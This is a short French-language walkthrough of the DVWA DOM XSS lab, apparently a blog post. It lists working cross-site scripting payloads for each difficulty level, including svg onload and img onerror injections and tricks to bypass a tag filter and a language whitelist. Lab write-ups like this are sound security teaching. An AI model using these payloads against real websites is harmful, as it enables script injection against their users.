+++
title = "DVWA - XSS (DOM)"
date = 2025-12-23
categories = ["DVWA"]
description = "Explication technique"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++

> Approche alternative: Bruteforcer le champs vulnérable

# Easy
- Aucune protection : modifiez l'URL `?default=<script>alert('DOM XSS Easy!')</script>`.
- Le JS parse default, `document.write()` exécute le payload dans `<option>`, déclenchant l'alert au chargement DOM.

# Medium
- Filtre `stripos($default, '<script>')` redirige vers `?default=English` si la balise est détectée.
- Utilisez `?default=</select><svg onload=alert('DOM XSS Medium')>` pour casser `<select>` ouvert et injecter nouvelle balise.
- Autres : `</select><img src=x onerror=alert('XSS')>` ou `</select><body onload=alert(1)>`.

# Hard
- Switch whitelist 4 langues (English, Français, Español, Deutsch) ; tout autre redirige vers `?default=English`.
- Payload : `?default=English&</select><svg onload=alert('DOM XSS High')>` (opérateur `&` valide la whitelist, `</select>` casse DOM).
- Alternatives : `English#</select><body onload=alert('XSS')> ou English&</select><marquee onstart=alert(1)>`.
